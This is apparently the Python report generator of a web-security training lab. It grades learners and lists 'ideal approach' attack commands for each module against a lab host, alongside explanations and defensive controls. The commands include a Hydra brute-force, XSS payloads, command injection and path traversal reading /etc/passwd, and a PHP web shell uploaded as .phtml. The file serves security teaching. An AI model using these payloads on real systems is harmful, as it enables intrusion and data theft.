"""
backend/report_generator.py — Post-mission report generator.

Produces a structured debrief from session state + target-agent events.
Called by main.py after a mission completes (or on demand).
"""
from __future__ import annotations

import time
from typing import Any, Dict, List, Optional

from backend.lab_progress import PROGRESS_SPECS


# ── Helpers ──────────────────────────────────────────────────────────────────

def _fmt_time(seconds: int) -> str:
    m, s = divmod(int(seconds), 60)
    return f"{m:02d}:{s:02d}"


def _normalize_mode(mode: str) -> str:
    if mode in ("guided",):
        return "tutorial"
    if mode in ("operator",):
        return "lab"
    return mode if mode in ("tutorial", "lab") else "tutorial"


# ── Ideal approach (one per module) — mirrored from missionBriefings.js ──────

_IDEAL_STEPS: Dict[str, List[Dict[str, Any]]] = {
    "recon": [
        {
            "step": 1,
            "title": "Probe the target home page",
            "command": "curl -i http://target-agent/op/",
            "why": "Confirms reachability and captures the server banner (Werkzeug/Python version).",
        },
        {
            "step": 2,
            "title": "Enumerate hidden routes with a wordlist",
            "command": "gobuster dir -u http://target-agent/op -w /usr/share/wordlists/dirb/common.txt -t 20 -q",
            "why": "Discovers paths not advertised in the UI — the hidden .git/config lives here.",
        },
        {
            "step": 3,
            "title": "Read the leaked .git/config",
            "command": "curl -s http://target-agent/op/.git/config",
            "why": "Leaks internal repo URL — confirms information disclosure from version control exposure.",
        },
        {
            "step": 4,
            "title": "Touch each area to trigger recon-sequence detection",
            "command": "curl -s http://target-agent/op/search?q=test && curl -s http://target-agent/op/system/ping?host=127.0.0.1 && curl -s http://target-agent/op/files/read?path=readme.txt",
            "why": "Visiting 4+ distinct portal areas triggers the recon_sequence_observed synthetic event.",
        },
    ],
    "brute_force": [
        {
            "step": 1,
            "title": "Confirm the login endpoint",
            "command": "curl -i http://target-agent/op/auth/login",
            "why": "Verify the endpoint exists and inspect the form structure before attacking.",
        },
        {
            "step": 2,
            "title": "Test a credential manually",
            "command": "curl -s -X POST http://target-agent/op/auth/login -d 'username=admin&password=wrong'",
            "why": "Confirm the failure response and check whether username enumeration is present.",
        },
        {
            "step": 3,
            "title": "Run a wordlist attack with Hydra",
            "command": "hydra -L /lab/users.txt -P /wordlists/rockyou-mini.txt target-agent http-post-form '/op/auth/login:username=^USER^&password=^PASS^:Invalid credentials' -t 4 -f",
            "why": "Automates the brute force — drives 3+ failures triggering the pattern detection event.",
        },
        {
            "step": 4,
            "title": "Confirm the valid credential",
            "command": "curl -i -X POST http://target-agent/op/auth/login -d 'username=admin&password=Br3akMe%212025'",
            "why": "A 302 redirect to /profile/ proves the credential is valid.",
        },
    ],
    "xss": [
        {
            "step": 1,
            "title": "Confirm reflection",
            "command": "curl -s 'http://target-agent/op/search?q=hello' | grep -A1 'Search Results'",
            "why": "Verify the q parameter is reflected verbatim in the response.",
        },
        {
            "step": 2,
            "title": "Send a script-tag payload",
            "command": "curl -s --data-urlencode 'q=<script>alert(1)</script>' -G http://target-agent/op/search | grep -oE '<script[^<]*</script>'",
            "why": "If the literal <script> tag appears unescaped, reflection is unsafe.",
        },
        {
            "step": 3,
            "title": "Try event-handler alternatives",
            "command": "curl -s -G --data-urlencode 'q=<img src=x onerror=alert(1)>' http://target-agent/op/search | grep -oE '<img[^>]*>'",
            "why": "Image onerror and SVG onload bypass naive script-tag filters.",
        },
        {
            "step": 4,
            "title": "Confirm verbatim reflection with diff",
            "command": "diff <(echo '<script>alert(1)</script>') <(curl -s --data-urlencode 'q=<script>alert(1)</script>' -G http://target-agent/op/search | grep -oE '<script[^<]*</script>')",
            "why": "Zero diff output proves input and output are byte-identical — no encoding applied.",
        },
    ],
    "cmd_injection": [
        {
            "step": 1,
            "title": "Probe the ping endpoint",
            "command": "curl -s 'http://target-agent/op/system/ping?host=127.0.0.1' | grep -A2 'PING'",
            "why": "Establish normal behavior and confirm the parameter is reflected in the command output.",
        },
        {
            "step": 2,
            "title": "Test shell separators",
            "command": "curl -s -G --data-urlencode 'host=127.0.0.1; id' http://target-agent/op/system/ping | tail -3",
            "why": "Semicolons and pipes are the most common metacharacters — test them first.",
        },
        {
            "step": 3,
            "title": "Bypass with $() substitution",
            "command": "curl -s -G --data-urlencode 'host=127.0.0.1$(head -1 /etc/passwd)' http://target-agent/op/system/ping | grep -oE 'root:[^ ]+'",
            "why": "The filter misses $() — the subshell is evaluated server-side and leaks into the ping error.",
        },
        {
            "step": 4,
            "title": "Confirm with a second file",
            "command": "curl -s -G --data-urlencode 'host=127.0.0.1$(cat /etc/hostname)' http://target-agent/op/system/ping | grep -oE 'ping:[^<]*'",
            "why": "Reading a second sensitive path proves the injection is general, not a fluke.",
        },
    ],
    "dir_traversal": [
        {
            "step": 1,
            "title": "Probe the file viewer",
            "command": "curl -s 'http://target-agent/op/files/read?path=readme.txt'",
            "why": "Establish baseline — verify the endpoint returns file content as expected.",
        },
        {
            "step": 2,
            "title": "Try basic ../ traversal",
            "command": "curl -s 'http://target-agent/op/files/read?path=../../etc/passwd'",
            "why": "Classic traversal attempt — even if blocked, it confirms the server processes the path.",
        },
        {
            "step": 3,
            "title": "Bypass with an absolute path",
            "command": "curl -s 'http://target-agent/op/files/read?path=/etc/passwd' | grep -E '^root:'",
            "why": "The .. filter is naive — absolute paths bypass it entirely.",
        },
        {
            "step": 4,
            "title": "Disclose a second sensitive file",
            "command": "curl -s 'http://target-agent/op/files/read?path=/etc/hostname' | head -1",
            "why": "A second disclosure confirms the bypass is general and the finding is exploitable.",
        },
    ],
    "file_upload": [
        {
            "step": 1,
            "title": "Inspect the upload endpoint",
            "command": "curl -s http://target-agent/op/files/upload | grep -i upload",
            "why": "Confirm the endpoint accepts multipart POSTs and note the form field names.",
        },
        {
            "step": 2,
            "title": "Upload a benign file",
            "command": "echo 'hello' > /tmp/probe.txt && curl -s -F 'file=@/tmp/probe.txt' http://target-agent/op/files/upload | grep -oE '/static/uploads/[^\"]+'",
            "why": "Establish baseline — confirm storage path, filename preservation, and URL structure.",
        },
        {
            "step": 3,
            "title": "Bypass with .phtml",
            "command": "echo '<?php echo shell_exec($_GET[\"c\"]); ?>' > /tmp/shell.phtml && curl -s -F 'file=@/tmp/shell.phtml' http://target-agent/op/files/upload | grep -oE '/static/uploads/[^\"]+'",
            "why": "The block list blocks .php but misses .phtml — a sibling extension many servers execute.",
        },
        {
            "step": 4,
            "title": "Verify the upload is stored and accessible",
            "command": "curl -s http://target-agent/static/uploads/shell.phtml | head -3",
            "why": "Confirms the dangerous file is publicly accessible — completing the exploit chain.",
        },
    ],
    "csrf": [
        {
            "step": 1,
            "title": "Authenticate and capture the session cookie",
            "command": "curl -c /tmp/cookies.txt -s -X POST http://target-agent/op/auth/login -d 'username=admin&password=Br3akMe%212025' -o /dev/null -w 'HTTP %{http_code}'",
            "why": "CSRF requires an active session — you need a valid cookie before the attack is meaningful.",
        },
        {
            "step": 2,
            "title": "Confirm no CSRF token in the form",
            "command": "curl -b /tmp/cookies.txt -s http://target-agent/op/profile/ | grep -E 'csrf|token|hidden' || echo 'NO CSRF TOKEN FOUND'",
            "why": "Missing anti-CSRF token is the prerequisite — verify it before forging a request.",
        },
        {
            "step": 3,
            "title": "Forge a POST with a spoofed Referer",
            "command": "curl -b /tmp/cookies.txt -s -X POST -H 'Referer: http://target-agent/profile/' http://target-agent/op/profile/update -d 'email=pwned@evil.lab' -w 'HTTP %{http_code}'",
            "why": "The backend's loose Referer check passes — the forged POST changes the profile.",
        },
        {
            "step": 4,
            "title": "Confirm the state change persisted",
            "command": "curl -b /tmp/cookies.txt -s http://target-agent/op/profile/ | grep -oE 'pwned@evil[^<]*'",
            "why": "Re-reading the profile confirms the email mutation — proving real impact.",
        },
    ],
}

# ── Vulnerability explanations ────────────────────────────────────────────────

_VULN_EXPLAINED: Dict[str, Dict[str, str]] = {
    "recon": {
        "name": "Information Disclosure / Attack Surface Exposure",
        "cvss_category": "MEDIUM",
        "what_it_is": (
            "The application exposes excessive internal details: server version banners, "
            "HTML comments with framework info, robots.txt disclosing hidden admin paths, "
            "and a leaked .git/config. These give an attacker a precise map of the stack."
        ),
        "why_it_matters": (
            "Reconnaissance is the first phase of every real penetration test. "
            "Information disclosure shortens the attacker's work dramatically — "
            "every detail leaked narrows the payload list and speeds up exploitation."
        ),
        "real_world_example": (
            "In 2017, a researcher discovered Facebook's internal repos via a leaked .git directory "
            "on a staging subdomain, disclosing source code and credentials."
        ),
    },
    "brute_force": {
        "name": "Broken Authentication — No Rate Limiting or Lockout (OWASP A07:2021)",
        "cvss_category": "HIGH",
        "what_it_is": (
            "The login endpoint accepts unlimited password attempts with no delay, no CAPTCHA, "
            "no account lockout, and distinct error messages that confirm valid usernames. "
            "Any password list can be exhausted against a known user."
        ),
        "why_it_matters": (
            "Credential stuffing and brute force account for over 80% of breaches involving hacking "
            "(Verizon DBIR). Without rate limiting, an attacker can test thousands of passwords per minute "
            "using tools like Hydra, Medusa, or Burp Intruder."
        ),
        "real_world_example": (
            "In 2022, the Uber breach started with an MFA fatigue attack after an attacker "
            "obtained credentials via credential stuffing — no rate limit on the contractor VPN."
        ),
    },
    "xss": {
        "name": "Reflected Cross-Site Scripting — XSS (OWASP A03:2021)",
        "cvss_category": "HIGH",
        "what_it_is": (
            "The search endpoint reflects the 'q' query parameter verbatim into the HTML response "
            "using Jinja's |safe filter, which disables all output escaping. "
            "Any HTML or JavaScript in the query executes in the victim's browser."
        ),
        "why_it_matters": (
            "Reflected XSS can steal session cookies, perform actions on behalf of the victim, "
            "redirect users to phishing pages, and exfiltrate sensitive data. "
            "It is one of the most prevalent web vulnerabilities (OWASP Top 10 since 2003)."
        ),
        "real_world_example": (
            "In 2014, eBay had a stored XSS vulnerability that allowed attackers to redirect users "
            "to credential-harvesting pages. Similar reflected XSS bugs appear regularly in bug bounties."
        ),
    },
    "cmd_injection": {
        "name": "OS Command Injection — RCE (OWASP A03:2021)",
        "cvss_category": "CRITICAL",
        "what_it_is": (
            "The ping diagnostics page passes the 'host' parameter directly to os.popen() "
            "with no sanitization. Shell metacharacters ($(), backticks, ;, |, &&) "
            "allow an attacker to append arbitrary OS commands that execute on the server."
        ),
        "why_it_matters": (
            "Command injection gives the attacker full server access — read files, establish persistence, "
            "pivot to internal networks, and exfiltrate data. It is rated CRITICAL (CVSS 9.8+) "
            "in most vulnerability scoring frameworks."
        ),
        "real_world_example": (
            "The 2014 Shellshock vulnerability (CVE-2014-6271) was a command injection bug in Bash "
            "that affected millions of servers running CGI scripts — attackers could execute arbitrary "
            "commands via crafted HTTP headers."
        ),
    },
    "dir_traversal": {
        "name": "Path Traversal / Directory Traversal (OWASP A01:2021)",
        "cvss_category": "HIGH",
        "what_it_is": (
            "The file viewer concatenates the 'path' parameter to a base directory without "
            "normalization. Both ../ sequences and absolute paths (like /etc/passwd) bypass "
            "the intended document root and allow reading arbitrary server files."
        ),
        "why_it_matters": (
            "Path traversal can expose configuration files, source code, environment variables, "
            "and credentials. Combined with other vulnerabilities, it enables full server compromise. "
            "It is classified under Broken Access Control (OWASP A01:2021)."
        ),
        "real_world_example": (
            "CVE-2021-41773 — Apache HTTP Server 2.4.49 had a path traversal bug that "
            "allowed unauthenticated attackers to read files outside the document root. "
            "Exploited in the wild within 24 hours of disclosure."
        ),
    },
    "file_upload": {
        "name": "Unrestricted Dangerous File Upload (OWASP A04:2021)",
        "cvss_category": "HIGH",
        "what_it_is": (
            "The upload endpoint accepts any file extension and any MIME type, "
            "saves files with their original filenames in a publicly accessible directory, "
            "and performs no content-type validation. Dangerous extensions like .phtml "
            "bypass the naive block list."
        ),
        "why_it_matters": (
            "On servers with PHP, JSP, or CGI execution enabled, uploading a shell script "
            "leads to Remote Code Execution. Even without execution, dangerous uploads "
            "enable stored XSS, phishing pages, and malware distribution."
        ),
        "real_world_example": (
            "In 2020, a file upload bypass in a government portal allowed attackers to upload "
            ".phtml webshells, gaining shell access to the web server."
        ),
    },
    "csrf": {
        "name": "Cross-Site Request Forgery — CSRF (OWASP A01:2021)",
        "cvss_category": "MEDIUM",
        "what_it_is": (
            "The profile update endpoint accepts state-changing POST requests without requiring "
            "a CSRF token, and the Referer check is easily spoofed via the curl -H flag. "
            "Any page can silently submit a hidden form to change profile data."
        ),
        "why_it_matters": (
            "CSRF can change passwords, transfer funds, alter account settings, or delete data "
            "without the victim's knowledge. Modern frameworks include CSRF protection by default, "
            "but custom APIs and SPAs frequently omit it."
        ),
        "real_world_example": (
            "In 2008, a CSRF vulnerability in the Netflix DVD queue allowed attackers to add "
            "DVDs or change account settings by tricking logged-in users into visiting a malicious page."
        ),
    },
}

# ── Defensive controls per module ─────────────────────────────────────────────

_DEFENSIVE_CONTROLS: Dict[str, List[Dict[str, str]]] = {
    "recon": [
        {
            "control": "Remove production debug information",
            "implementation": "Strip server version banners from HTTP response headers and HTML comments. Use a generic server name in production.",
        },
        {
            "control": "Harden robots.txt and metadata files",
            "implementation": "Never list sensitive or restricted paths in robots.txt. Keep security.txt minimal.",
        },
        {
            "control": "Monitor for enumeration patterns",
            "implementation": "Alert on high route cardinality, rapid 404 bursts, and access to hidden files from a single IP.",
        },
    ],
    "brute_force": [
        {
            "control": "Rate limiting",
            "implementation": "Limit login attempts to 5 per minute per IP and per account using middleware or WAF rules.",
        },
        {
            "control": "Account lockout",
            "implementation": "Lock accounts for 15 minutes after 5 consecutive failures. Notify the account owner.",
        },
        {
            "control": "Generic error messages",
            "implementation": "Return the same message for unknown users and wrong passwords: 'Invalid username or password.'",
        },
        {
            "control": "Multi-factor authentication (MFA)",
            "implementation": "Require TOTP or push MFA for all privileged accounts regardless of password strength.",
        },
    ],
    "xss": [
        {
            "control": "Contextual output encoding",
            "implementation": "Render user content through the template engine auto-escape path. Never use |safe or dangerouslySetInnerHTML on untrusted data.",
        },
        {
            "control": "Content Security Policy (CSP)",
            "implementation": "Set script-src 'self' with nonces. Block inline scripts and eval() in the CSP header.",
        },
        {
            "control": "HttpOnly cookies",
            "implementation": "Set HttpOnly on session cookies so XSS cannot steal them via document.cookie.",
        },
    ],
    "cmd_injection": [
        {
            "control": "Use subprocess without a shell",
            "implementation": "Replace os.popen() with subprocess.run([\"ping\", \"-c\", \"2\", host], shell=False). Never build shell command strings from user input.",
        },
        {
            "control": "Allowlist host input",
            "implementation": "Accept only valid IP addresses (ipaddress module) or DNS names (conservative regex). Reject anything containing shell metacharacters.",
        },
        {
            "control": "Least privilege",
            "implementation": "Run the web process under a restricted user. Mount no secrets in the container. Isolate the service from internal networks.",
        },
    ],
    "dir_traversal": [
        {
            "control": "Resolve then validate",
            "implementation": "Use pathlib.Path(base, user_path).resolve() and reject the request if the resolved path is outside the base directory.",
        },
        {
            "control": "Use file identifiers instead of paths",
            "implementation": "Expose document IDs or slugs mapped server-side to known files. Never pass raw user input to open().",
        },
        {
            "control": "Minimal filesystem footprint",
            "implementation": "Run in a container with only required files readable. No secrets in environment variables or config files accessible to the web process.",
        },
    ],
    "file_upload": [
        {
            "control": "Extension and content allowlist",
            "implementation": "Allow only business-required types. Validate file signatures (magic bytes) server-side. Reject MIME/extension mismatches.",
        },
        {
            "control": "Randomized names and isolated storage",
            "implementation": "Store files outside the web root using random UUIDs as filenames. Serve through a signed URL or download endpoint.",
        },
        {
            "control": "Malware scanning and size limits",
            "implementation": "Apply per-user quotas, maximum file sizes, and AV scanning before accepting uploads.",
        },
    ],
    "csrf": [
        {
            "control": "CSRF tokens on all state-changing forms",
            "implementation": "Generate an unpredictable per-session token, embed it in every form, and validate it server-side before processing.",
        },
        {
            "control": "SameSite=Strict cookie attribute",
            "implementation": "Set session cookies with SameSite=Strict so browsers do not attach them to cross-site requests.",
        },
        {
            "control": "Origin/Referer validation",
            "implementation": "Require Origin or Referer to match the expected site origin for all state-changing endpoints. Treat this as a backup to tokens.",
        },
    ],
}


# ── Main generator ─────────────────────────────────────────────────────────────

def generate(session: Any, events: List[Dict[str, Any]], mode: str = "tutorial") -> Dict[str, Any]:
    """
    Generate a structured mission report.

    Parameters
    ----------
    session : SessionRecord (or any object with the expected attributes)
    events  : raw events from target-agent /lab/events since mission_started_at
    mode    : "tutorial" | "lab" (or legacy "guided" / "operator")
    """
    mode = _normalize_mode(mode)
    is_lab = (mode == "lab")

    module_id   = session.module.module_id
    module_name = session.module.name
    session_id  = session.session_id

    mission_started_at = getattr(session, "mission_started_at", None) or 0.0

    spec = PROGRESS_SPECS.get(module_id, {})
    task_ladder = (
        spec.get("tasks_lab") if is_lab else None
    ) or spec.get("tasks_tutorial", [])

    # Learning state — may not be present on a mock session
    learning_completed = list(
        getattr(session, "learning_completed_tasks", None)
        or getattr(session, "completed_steps", [])
    )
    learning_success  = bool(getattr(session, "learning_success", False))
    learning_done_at  = getattr(session, "learning_completed_at", None)

    # Determine success: session flag first, then from events
    success = learning_success
    if not success and events:
        success_key      = "success_lab" if is_lab else "success_tutorial"
        success_required = set(spec.get(success_key, []))
        seen_types       = {e.get("event_type") for e in events}
        if success_required and success_required <= seen_types:
            success = True

    # Duration
    now = time.time()
    if learning_done_at and mission_started_at:
        duration_s = max(0, int(learning_done_at - mission_started_at))
    elif mission_started_at:
        duration_s = max(0, int(now - mission_started_at))
    else:
        duration_s = 0

    # Event tallies for scoring
    event_count     = len(events)
    browser_count   = sum(1 for e in events if e.get("via") == "browser")
    attackbox_count = sum(1 for e in events if e.get("via") == "attackbox")

    # Task results
    task_results: List[Dict[str, Any]] = []
    for idx, t in enumerate(task_ladder):
        completed     = idx in learning_completed
        ev_count      = sum(1 for e in events if e.get("event_type") in set(t["event_types"]))
        if completed:
            feedback = f"Well done — you triggered '{t['title']}' correctly."
        else:
            feedback = f"Missed — {t.get('explain', 'Complete this step by following the ideal approach.')}"
        task_results.append({
            "title":          t["title"],
            "completed":      completed,
            "evidence_count": ev_count,
            "feedback":       feedback,
        })

    # Score
    total_tasks     = max(len(task_ladder), 1)
    completed_count = len(learning_completed)
    score = 0
    if success:
        score += 40
    score += int((completed_count / total_tasks) * 40)
    score += min(20, int((event_count / 10) * 20))
    if is_lab and browser_count > attackbox_count:
        score -= 10
    score = max(0, min(100, score))

    # Grade
    if success and score >= 90:
        grade = "S"
    elif success and score >= 75:
        grade = "A"
    elif success and score >= 55:
        grade = "B"
    elif score >= 30:
        grade = "C"
    else:
        grade = "F"

    # What you did right
    did_right: List[Dict[str, str]] = []
    for tr in task_results:
        if tr["completed"]:
            did_right.append({
                "title":  tr["title"],
                "detail": (
                    f"Completing '{tr['title']}' proves you know how to trigger this "
                    "vulnerability step. This is exactly what a real attacker would do."
                ),
            })

    # What you missed
    missed: List[Dict[str, str]] = []
    for idx, tr in enumerate(task_results):
        if not tr["completed"]:
            task_spec   = task_ladder[idx] if idx < len(task_ladder) else {}
            how_to_fix  = task_spec.get("explain", "Follow the ideal approach steps listed below.")
            missed.append({
                "title":       tr["title"],
                "detail":      "This step was not completed during your session.",
                "how_to_fix":  how_to_fix,
            })

    # Summary
    if success:
        summary = (
            f"You successfully completed the {module_name} module in {_fmt_time(duration_s)}. "
            "All required vulnerability indicators were triggered. "
        )
        summary += (
            f"You missed {len(missed)} of {total_tasks} tasks — "
            "review the 'What You Missed' section to refine your technique."
            if missed else
            "Excellent execution — every task was completed."
        )
    else:
        summary = (
            f"You did not fully complete the {module_name} module. "
            f"{completed_count} of {total_tasks} tasks were completed. "
        )
        summary += (
            "Good progress — review the missed steps and retry to confirm the vulnerability."
            if completed_count > 0 else
            "No tasks were completed. Study the ideal approach below and retry."
        )

    # Evidence timeline
    start_ts = mission_started_at or (events[0]["ts"] if events else now)
    timeline: List[Dict[str, Any]] = []
    for e in sorted(events, key=lambda x: x.get("ts", 0)):
        timeline.append({
            "timestamp":  e.get("ts", 0),
            "relative_s": max(0, int(e.get("ts", start_ts) - start_ts)),
            "event_type": e.get("event_type", "unknown"),
            "via":        e.get("via", "unknown"),
            "description": e.get("learner_message") or e.get("event_type", "unknown"),
        })

    return {
        "session_id":             session_id,
        "module_id":              module_id,
        "module_name":            module_name,
        "generated_at":           now,
        "mode":                   mode,
        "grade":                  grade,
        "score":                  score,
        "duration_seconds":       duration_s,
        "success":                success,
        "summary":                summary,
        "what_you_did_right":     did_right,
        "what_you_missed":        missed,
        "ideal_approach":         _IDEAL_STEPS.get(module_id, []),
        "vulnerability_explained": _VULN_EXPLAINED.get(module_id, {
            "name":             module_name,
            "cvss_category":    "MEDIUM",
            "what_it_is":       "A security vulnerability in the target application.",
            "why_it_matters":   "This vulnerability can be exploited by an attacker to cause harm.",
            "real_world_example": "Similar vulnerabilities appear regularly in real-world applications.",
        }),
        "defensive_controls": _DEFENSIVE_CONTROLS.get(module_id, [
            {"control": "Input validation",
             "implementation": "Validate all user-controlled inputs server-side before processing."},
        ]),
        "evidence_timeline": timeline,
        "task_results":      task_results,
    }
